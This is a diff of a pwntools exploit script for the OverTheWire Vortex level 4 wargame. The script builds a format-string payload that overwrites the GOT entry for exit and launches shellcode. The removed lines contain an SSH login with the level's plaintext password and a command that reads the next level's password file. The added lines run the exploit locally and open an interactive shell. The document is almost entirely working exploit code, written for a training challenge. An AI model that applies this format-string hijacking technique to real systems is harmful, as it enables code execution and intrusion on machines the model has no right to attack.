@@ -4,23 +4,10 @@ from libformatstr import FormatStr
 context.arch='i386'
 context.os='linux'
 
-s = ssh(host='vortex.labs.overthewire.org', user='vortex4', password='2YmgK1=jw')
-s.download_file('/vortex/vortex4')
-
-# compile files that prepare the env
-s.upload_file('level4.c', remote='/tmp/level4.c')
-s.run_to_end('gcc -m32 -o /tmp/v4 /tmp/level4.c', wd='/tmp')
-
-s.upload_file('leaker.c', remote='/tmp/leaker.c')
-s.run_to_end('gcc -m32 -o /tmp/leaker /tmp/leaker.c', wd='/tmp')
-
-
-def run(payload, prog='/vortex/vortex4', getflag=False):
-    p = s.run("/tmp/v4 %s '%s'" % (prog, payload))
-    if getflag:
-        p.clean()
-        p.send('cat /etc/vortex_pass/vortex5\n')
-        return p.recvline()
+def run(payload, prog='./vortex4-fixed', interactive=False):
+    p = process([prog, '', '', payload])
+    if interactive:
+        p.interactive()
     else:
         return p.recvall()
 
@@ -53,9 +40,9 @@ size = 200
 
 exe = ELF('./vortex4')
 
-leaked = int(run('X' * size, prog='/tmp/leaker'), base=16)
+leaked = int(run('X' * size, prog='./leaker'), base=16)
 
-offset, padding = get_offset(size=size, start=100, end=101)
+offset, padding = get_offset(size=size, start=100)
 
 f = FormatStr()
 f[exe.got['exit']] = leaked + 50
@@ -71,5 +58,6 @@ log.info('Offset: %d', offset)
 log.info('Padding: %d', padding)
 log.info('Ptr: 0x%x', leaked)
 log.info('GOT: 0x%x', exe.got['exit'])
+log.info('Payload: %s', repr(shellcode))
 
-log.success('Flag: %s', run(shellcode, getflag=True))
+run(shellcode, interactive=True)
